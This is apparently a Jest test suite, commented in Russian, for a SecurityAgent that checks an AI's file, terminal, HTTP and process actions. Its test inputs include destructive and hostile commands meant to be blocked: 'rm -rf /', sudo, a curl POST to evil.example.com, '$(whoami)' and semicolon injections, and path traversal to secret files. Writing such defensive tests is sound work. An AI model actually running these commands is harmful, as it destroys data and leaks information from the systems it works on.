/**
 * SecurityAgent Tests — валидация и защита действий ИИ.
 *
 * Проверяются: вердикты allow/deny/require-confirmation для операций
 * file/terminal/http/process, чёрный список команд и инъекций, изоляция
 * путей, чувствительные пути (.env/.git/node_modules), http-валидация
 * (https + белый список хостов), аудит через getDecisions() и AuditLog.
 */

import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { AuditLog } from '../audit/audit-log.js';
import { SecurityAgent } from './security-agent.js';
import type {
  SecurityActionRequest,
  SecurityAgentOptions,
} from './security-agent.js';

// ─── Helpers ───────────────────────────────────────────────

function createAgent(options?: SecurityAgentOptions): SecurityAgent {
  return new SecurityAgent({ name: 'SecurityAgent' }, options);
}

// ─── Terminal ──────────────────────────────────────────────

describe('SecurityAgent — terminal: allow безопасных команд', () => {
  let tmp: string;

  beforeEach(() => {
    tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'security-agent-test-'));
  });

  afterEach(() => {
    fs.rmSync(tmp, { recursive: true, force: true });
  });

  it('разрешает ls', () => {
    const decision = createAgent({ roots: [tmp] }).validate({
      kind: 'terminal',
      command: 'ls',
    });
    expect(decision.verdict).toBe('allow');
    expect(decision.matchedRules).toContain('command.allowed');
  });

  it('разрешает cat файла внутри корня', () => {
    const decision = createAgent({ roots: [tmp] }).validate({
      kind: 'terminal',
      command: 'cat',
      args: ['./file.txt'],
    });
    expect(decision.verdict).toBe('allow');
  });

  it('разрешает npm run build и git status', () => {
    const agent = createAgent({ roots: [tmp] });
    expect(
      agent.validate({
        kind: 'terminal',
        command: 'npm',
        args: ['run', 'build'],
      }).verdict,
    ).toBe('allow');
    expect(
      agent.validate({ kind: 'terminal', command: 'git', args: ['status'] })
        .verdict,
    ).toBe('allow');
  });

  it('разрешает чтение файла в корне (file kind)', () => {
    const decision = createAgent({ roots: [tmp] }).validate({
      kind: 'file',
      action: 'read',
      path: 'docs/notes.txt',
    });
    expect(decision.verdict).toBe('allow');
    expect(decision.matchedRules).toContain('path.allowed');
  });
});

describe('SecurityAgent — terminal: deny опасных команд', () => {
  it('блокирует rm -rf', () => {
    const decision = createAgent().validate({
      kind: 'terminal',
      command: 'rm',
      args: ['-rf', '/'],
    });
    expect(decision.verdict).toBe('deny');
  });

  it('блокирует rm -rf по чёрному списку (не только whitelist)', () => {
    const agent = createAgent({ enforceCommandWhitelist: false });
    const decision = agent.validate({
      kind: 'terminal',
      command: 'rm',
      args: ['-rf', '/'],
    });
    expect(decision.verdict).toBe('deny');
    expect(decision.matchedRules).toContain('command.deny-pattern');
    expect(decision.reason).toContain('чёрным списком');
  });

  it('блокирует sudo', () => {
    const decision = createAgent().validate({
      kind: 'terminal',
      command: 'sudo apt install curl',
    });
    expect(decision.verdict).toBe('deny');
  });

  it('блокирует команды вне whitelist (curl)', () => {
    const decision = createAgent().validate({
      kind: 'terminal',
      command: 'curl',
      args: ['-X', 'POST', 'http://evil.example.com'],
    });
    expect(decision.verdict).toBe('deny');
    expect(decision.matchedRules).toContain('command.whitelist');
  });

  it('блокирует символы инъекций $(...)', () => {
    const decision = createAgent().validate({
      kind: 'terminal',
      command: 'echo',
      args: ['$(whoami)'],
    });
    expect(decision.verdict).toBe('deny');
    expect(decision.matchedRules).toContain('command.injection');
  });

  it('блокирует символы инъекций ;', () => {
    const decision = createAgent().validate({
      kind: 'terminal',
      command: 'echo',
      args: ['ok;rm', '-rf', '/'],
    });
    expect(decision.verdict).toBe('deny');
  });

  it('блокирует редирект в системный путь', () => {
    const decision = createAgent({ enforceCommandWhitelist: false }).validate({
      kind: 'terminal',
      command: 'echo',
      args: ['x > C:\\Windows\\temp\\evil.bat'],
    });
    expect(decision.verdict).toBe('deny');
  });
});

describe('SecurityAgent — file: пути и чувствительные операции', () => {
  let tmp: string;

  beforeEach(() => {
    tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'security-agent-test-'));
  });

  afterEach(() => {
    fs.rmSync(tmp, { recursive: true, force: true });
  });

  it('блокирует абсолютный путь вне корня', () => {
    const outside = path.join(os.tmpdir(), 'security-outside-root.txt');
    const decision = createAgent({ roots: [tmp] }).validate({
      kind: 'file',
      path: outside,
    });
    expect(decision.verdict).toBe('deny');
    expect(decision.matchedRules).toContain('path.outside-root');
  });

  it('блокирует выход за корень через ../', () => {
    const decision = createAgent({ roots: [tmp] }).validate({
      kind: 'file',
      path: '..\\..\\secret.txt',
    });
    expect(decision.verdict).toBe('deny');
  });

  it('блокирует путевой аргумент команды вне корня', () => {
    const decision = createAgent({ roots: [tmp] }).validate({
      kind: 'terminal',
      command: 'cat',
      args: ['..\\..\\secret.txt'],
    });
    expect(decision.verdict).toBe('deny');
    expect(decision.matchedRules).toContain('path.outside-root');
  });

  it('требует подтверждения для удаления файла', () => {
    const decision = createAgent({ roots: [tmp] }).validate({
      kind: 'file',
      action: 'delete',
      path: 'data.txt',
    });
    expect(decision.verdict).toBe('require-confirmation');
    expect(decision.dangerLevel).toBe('medium');
    expect(decision.matchedRules).toContain('file.delete');
  });

  it('требует подтверждения для удаления через команду rm', () => {
    const decision = createAgent({ roots: [tmp] }).validate({
      kind: 'file',
      action: 'write',
      command: 'rm data.txt',
      path: 'data.txt',
    });
    expect(decision.verdict).toBe('require-confirmation');
    expect(decision.matchedRules).toContain('file.delete');
  });

  it('запрещает удаление корня агента', () => {
    const decision = createAgent({ roots: [tmp] }).validate({
      kind: 'file',
      action: 'delete',
      path: tmp,
    });
    expect(decision.verdict).toBe('deny');
    expect(decision.matchedRules).toContain('file.delete-root');
  });

  it('требует подтверждения для .env', () => {
    const decision = createAgent({ roots: [tmp] }).validate({
      kind: 'file',
      path: '.env',
    });
    expect(decision.verdict).toBe('require-confirmation');
    expect(decision.dangerLevel).toBe('high');
    expect(decision.matchedRules).toContain('path.sensitive');
  });

  it('требует подтверждения для .git', () => {
    const decision = createAgent({ roots: [tmp] }).validate({
      kind: 'file',
      path: '.git/config',
    });
    expect(decision.verdict).toBe('require-confirmation');
    expect(decision.dangerLevel).toBe('high');
  });

  it('требует подтверждения для node_modules', () => {
    const decision = createAgent({ roots: [tmp] }).validate({
      kind: 'file',
      action: 'delete',
      path: 'node_modules/package/index.js',
    });
    expect(decision.verdict).toBe('require-confirmation');
    expect(decision.dangerLevel).toBe('medium');
  });

  it('требует подтверждения для системных путей', () => {
    const root = process.platform === 'win32' ? 'C:\\' : '/';
    const systemPath =
      process.platform === 'win32'
        ? 'C:\\Windows\\System32\\drivers\\etc\\hosts'
        : '/etc/hosts';
    const decision = createAgent({ roots: [root] }).validate({
      kind: 'file',
      path: systemPath,
    });
    expect(decision.verdict).toBe('require-confirmation');
    expect(decision.dangerLevel).toBe('high');
    expect(decision.matchedRules).toContain('path.system');
  });

  it('не путает .gitignore с .git', () => {
    const decision = createAgent({ roots: [tmp] }).validate({
      kind: 'file',
      action: 'write',
      path: '.gitignore',
    });
    expect(decision.verdict).toBe('allow');
  });
});

describe('SecurityAgent — http', () => {
  it('разрешает https на разрешённом хосте', () => {
    const decision = createAgent().validate({
      kind: 'http',
      url: 'https://moex.com/',
    });
    expect(decision.verdict).toBe('allow');
    expect(decision.matchedRules).toContain('http.allowed');
  });

  it('разрешает поддомен разрешённого хоста', () => {
    const decision = createAgent().validate({
      kind: 'http',
      url: 'https://iss.moex.com/iss/engines/stock/markets/shares/securities.json',
    });
    expect(decision.verdict).toBe('allow');
  });

  it('блокирует неизвестный хост', () => {
    const decision = createAgent().validate({
      kind: 'http',
      url: 'https://example.com/data',
    });
    expect(decision.verdict).toBe('deny');
    expect(decision.matchedRules).toContain('http.unknown-host');
    expect(decision.reason).toContain('example.com');
  });

  it('требует подтверждения для http без шифрования', () => {
    const decision = createAgent().validate({
      kind: 'http',
      url: 'http://moex.com/data',
    });
    expect(decision.verdict).toBe('require-confirmation');
    expect(decision.dangerLevel).toBe('medium');
    expect(decision.matchedRules).toContain('http.not-https');
  });

  it('блокирует некорректный URL', () => {
    const decision = createAgent().validate({
      kind: 'http',
      url: 'not-a-url',
    });
    expect(decision.verdict).toBe('deny');
  });

  it('блокирует URL с учётными данными', () => {
    const decision = createAgent().validate({
      kind: 'http',
      url: 'https://user:pass@moex.com/',
    });
    expect(decision.verdict).toBe('deny');
    expect(decision.matchedRules).toContain('http.credentials');
  });

  it('учитывает кастомный белый список хостов', () => {
    const agent = createAgent({ allowedHttpHosts: ['myhost.dev'] });
    expect(
      agent.validate({ kind: 'http', url: 'https://myhost.dev/' }).verdict,
    ).toBe('allow');
    expect(
      agent.validate({ kind: 'http', url: 'https://moex.com/' }).verdict,
    ).toBe('deny');
  });

  it('разрешает не-https при httpsOnly=false (после проверки хоста)', () => {
    const agent = createAgent({ httpsOnly: false });
    const decision = agent.validate({
      kind: 'http',
      url: 'http://cbr.ru/xml/daily.xml',
    });
    expect(decision.verdict).toBe('allow');
  });
});

describe('SecurityAgent — process', () => {
  it('требует подтверждения для запуска процесса', () => {
    const decision = createAgent().validate({
      kind: 'process',
      command: 'node',
      args: ['server.js'],
    });
    expect(decision.verdict).toBe('require-confirmation');
    expect(decision.dangerLevel).toBe('high');
    expect(decision.matchedRules).toContain('process.require-confirmation');
  });

  it('блокирует опасный процесс', () => {
    const decision = createAgent().validate({
      kind: 'process',
      command: 'sudo shutdown now',
    });
    expect(decision.verdict).toBe('deny');
  });
});

describe('SecurityAgent — аудит', () => {
  let tmp: string;

  beforeEach(() => {
    tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'security-agent-test-'));
  });

  afterEach(() => {
    fs.rmSync(tmp, { recursive: true, force: true });
  });

  it('записывает решения в историю getDecisions()', () => {
    const agent = createAgent({ roots: [tmp] });
    agent.validate({ kind: 'terminal', command: 'ls' });
    agent.validate({ kind: 'file', path: '.env' });
    agent.validate({ kind: 'terminal', command: 'rm', args: ['-rf', '/'] });

    const decisions = agent.getDecisions();
    expect(decisions).toHaveLength(3);
    expect(decisions[0]?.verdict).toBe('allow');
    expect(decisions[1]?.verdict).toBe('require-confirmation');
    expect(decisions[2]?.verdict).toBe('deny');
    expect(decisions[0]?.request.kind).toBe('terminal');
  });

  it('пишет вердикты в AuditLog как security.decision', () => {
    const auditLog = new AuditLog();
    const agent = createAgent({ roots: [tmp], auditLog });
    agent.validate({ kind: 'terminal', command: 'ls' });
    agent.validate({ kind: 'http', url: 'http://moex.com/x' });

    const entries = auditLog.getByType('security.decision');
    expect(entries).toHaveLength(2);
    expect(entries[0]?.actor).toBe('SecurityAgent');
    expect(entries[0]?.metadata?.verdict).toBe('allow');
    expect(entries[1]?.metadata?.verdict).toBe('require-confirmation');
    expect(entries[1]?.metadata?.dangerLevel).toBe('medium');
  });

  it('работает через execute() (AgentBase-контракт)', async () => {
    const agent = createAgent({ roots: [tmp] });
    const result = await agent.execute({
      kind: 'terminal',
      command: 'ls',
    });
    expect(result.success).toBe(true);
    const data = result.data as { verdict: string };
    expect(data.verdict).toBe('allow');
    expect(agent.getDecisions()).toHaveLength(1);
    expect(agent.totalExecutions).toBe(1);
  });

  it('ограничивает историю (maxHistory)', () => {
    const agent = createAgent({ maxHistory: 2 });
    agent.validate({ kind: 'terminal', command: 'ls' });
    agent.validate({ kind: 'terminal', command: 'pwd' });
    agent.validate({ kind: 'terminal', command: 'wc' });
    expect(agent.getDecisions()).toHaveLength(2);
  });
});

describe('SecurityAgent — входные данные', () => {
  it('бросает ошибку при отсутствии заявки', () => {
    const agent = createAgent();
    expect(() =>
      agent.validate(null as unknown as SecurityActionRequest),
    ).toThrow('заявка на действие отсутствует');
  });

  it('бросает ошибку при неизвестном типе операции', () => {
    const agent = createAgent();
    expect(() => agent.validate({ kind: 'unknown' as never })).toThrow(
      'неизвестный тип операции',
    );
  });
});
